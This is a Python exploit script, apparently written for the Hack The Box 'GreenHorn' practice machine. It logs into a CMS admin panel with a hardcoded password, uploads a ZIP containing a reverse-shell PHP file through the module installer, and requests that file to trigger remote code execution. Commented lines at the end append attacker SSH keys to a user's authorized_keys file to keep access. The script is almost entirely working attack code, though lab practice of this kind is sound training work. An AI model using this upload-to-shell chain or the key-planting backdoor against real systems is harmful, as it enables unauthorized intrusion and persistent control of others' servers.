#Replace greenhorn.htb
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder


login_url = "http://greenhorn.htb/login.php"
upload_url = "http://greenhorn.htb/admin.php?action=installmodule"
headers = {"Referer": login_url,}
login_payload = {"cont1": "iloveyou1","junior": "","submit": "Log in"}

file_path = "/home/kali/Workspace_Ethical_Hacking/hack_the_box/htb_machines/greenhorn/exploit/rev-shell.zip"#input("ZIP file path: ")

multipart_data = MultipartEncoder(
    fields={
        "sendfile": ("payload.zip", open(file_path, "rb"), "application/zip"),
        "submit": "Upload"
    }
)

session = requests.Session()
login_response = session.post(login_url, headers=headers, data=login_payload)


if login_response.status_code == 200:
    print("Login account")

 
    upload_headers = {
        "Referer": upload_url,
        "Content-Type": multipart_data.content_type
    }
    upload_response = session.post(upload_url, headers=upload_headers, data=multipart_data)

    
    if upload_response.status_code == 200:
        print("ZIP file download.")
    else:
        print("ZIP file download error. Response code:", upload_response.status_code)
else:
    print("Login problem. response code:", login_response.status_code)


rce_url="http://greenhorn.htb/data/modules/payload/rev-shell.php"

rce=requests.get(rce_url)

print(rce.text)


#echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP1qzFGdT3EdJbsJtmAd5D80xnEqG9rXI00IZ//uE7eZ kali@kali' >> /home/junior/.ssh/authorized_keys
#echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO/9ZSJCrimQf1bmKnldZJ8Dm/ECLVEcgMVQwKamG3ZZ kali@kali' >> /home/junior/.ssh/authorized_keys